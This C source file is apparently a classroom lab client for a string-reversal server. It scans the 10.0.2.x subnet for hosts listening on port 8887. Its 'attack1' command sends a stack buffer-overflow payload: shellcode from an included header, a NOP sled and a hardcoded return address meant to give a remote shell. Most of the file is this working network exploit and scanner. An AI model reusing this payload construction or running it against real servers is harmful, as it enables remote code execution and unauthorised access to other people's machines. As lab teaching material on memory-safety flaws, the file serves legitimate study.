#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include "shellcode.h"

#define MYPORT  8887
#define BUFFER_SIZE 1024

const char * response = "Recieved message successfully, and the reversed string is:";

int main()
{
    	//定义sockfd
    	int sock_cli = socket(AF_INET,SOCK_STREAM, 0);

    	//定义sockaddr_in
    	struct sockaddr_in servaddr;
    	memset(&servaddr, 0, sizeof(servaddr));
    	servaddr.sin_family = AF_INET;
    	servaddr.sin_port = htons(MYPORT);  ///服务器端口
    	//servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");  ///服务器ip
    	//servaddr.sin_addr.s_addr = inet_addr("10.0.2.5");

    	//连接服务器，成功返回0，错误返回-1
/*    	if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    	{
      	  perror("connect error");
       	  exit(1);
   	 }	*/

	// 扫描局域网ip，寻找目标服务器连接
	char addr[11]="10.0.2.x"; // 最后留一位作结束符
	char end_ip[4];	// 存放第四字段的ip值，最后留一位作结束符
	
	for(int i=0; i<256; i++)
	{
		memset(end_ip,'\0',sizeof(end_ip));	// 字符数组置空
		sprintf(end_ip, "%d", i);	// 实现int转换为char类型
		for(int j=0; j<strlen(end_ip); j++)
		{
			addr[j+7]=end_ip[j];
		}
		//printf("%s\n",addr);
		servaddr.sin_addr.s_addr = inet_addr(addr);
		if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) == 0)
			printf("%s is exist. Connect successfully!\n", addr);
		else	//连接服务器成功返回0,失败返回-1
			printf("%s is not exist.\n", addr);
	}


    	char sendbuf[276];
    	char recvbuf[256];
    	memset(sendbuf, 0, sizeof(sendbuf));
    	memset(recvbuf, 0, sizeof(recvbuf));
    	printf("Please input a string to reverse('exit' to quit,'attack1' to attack):");
    	while (fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)
    	{
        	if(strcmp(sendbuf,"exit\n")==0)
		{
	    		write(sock_cli, sendbuf, 256);
            		break;	
		}

		if(strcmp(sendbuf,"attack1\n")==0)
		{
	  		int i;
	  		char payload[276];

	  		for(i=0;i<strlen(shellcode1);i++)
	  		{
	    			payload[i]=shellcode1[i];
	  		}
	  		for(i=strlen(shellcode1);i<272;i++)
	  		{
	    			payload[i]='\x90';
	  		}
	  		payload[272]='\xfc';
	  		payload[273]='\xee';
	  		payload[274]='\xff';
	  		payload[275]='\xbf'; // buf:0xbfffeefc  &ret=0xbffff00c
	    		write(sock_cli, payload, 276);
	    		// 获取shell后结束通信
	    		printf("attack done.\n");
	    		break;
		}
		write(sock_cli, sendbuf, 256);
		printf("Recieved message successfully, and the reversed string is:"); // 提示信息
		read(sock_cli, recvbuf, 256);
	
        	fputs(recvbuf, stdout);
        	memset(sendbuf, 0, sizeof(sendbuf));
        	memset(recvbuf, 0, sizeof(recvbuf));
		printf("Please input a string to reverse('exit' to quit,'attack1' to attack):");
    	}
	printf("Client is disconnected from server.\n");
    	close(sock_cli);
    	return 0;
}
